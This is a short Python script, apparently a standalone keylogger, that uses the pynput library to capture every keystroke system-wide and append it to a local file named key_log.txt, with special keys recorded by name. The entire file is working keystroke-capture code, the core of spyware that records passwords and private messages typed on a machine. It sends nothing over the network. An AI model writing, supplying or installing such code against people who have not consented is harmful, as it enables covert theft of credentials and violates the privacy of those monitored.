from pynput.keyboard import Listener, Key

filename = "key_log.txt"  # The file to write characters to


def on_press(key):
    f = open(filename, 'a')  # Open the file

    if hasattr(key, 'char'):  # Write the character pressed if available
        f.write(key.char)
    elif key == Key.space:  # If space was pressed, write a space
        f.write(' ')
    elif key == Key.enter:  # If enter was pressed, write a new line
        f.write('\n')
    elif key == Key.tab:  # If tab was pressed, write a tab
        f.write('\t')
    else:  # If anything else was pressed, write [<key_name>]
        f.write('[' + key.name + ']')

    f.close()  # Close the file


with Listener(on_press=on_press) as listener:  # Setup the listener
    listener.join()  # Join the thread to the main thread
